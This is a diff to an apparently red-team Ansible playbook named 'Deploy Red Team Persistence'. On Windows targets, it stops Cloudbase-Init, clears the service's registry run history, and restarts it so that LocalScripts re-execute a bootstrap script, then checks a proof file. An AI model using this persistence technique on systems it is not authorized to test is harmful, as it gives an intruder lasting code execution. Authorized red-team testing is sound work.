@@ -1,4 +1,3 @@
-# deploy.yml (full revised playbook)
 - name: Deploy Red Team Persistence
   hosts: target_windows
 
@@ -24,6 +23,11 @@
         path: "C:\\Windows\\Temp\\bootstrap.ps1"
         state: absent
 
+    - name: Stop CloudBase-init service
+      win_service:
+        name: cloudbase-init
+        state: stopped
+
     - name: Clear CloudBase-init run history so plugins execute again
       win_shell: |
         $path = "HKLM:\SOFTWARE\Cloudbase Solutions\Cloudbase-Init"
@@ -43,12 +47,14 @@
             Write-Host "SUCCESS: Registry is clear"
         }
 
-    - name: Stop CloudBase-init service before starting fresh
-      win_service:
-        name: cloudbase-init
-        state: stopped
-
     - name: Start CloudBase-init to trigger LocalScripts execution
       win_service:
         name: cloudbase-init
         state: started
+
+    - name: Wait for CloudBase-init to finish running scripts
+      win_pause:
+        seconds: 45
+
+    - name: Confirm bootstrap ran successfully
+      win_shell: "Get-Item C:\\Users\\Public\\proof.txt | Select-Object LastWriteTime"
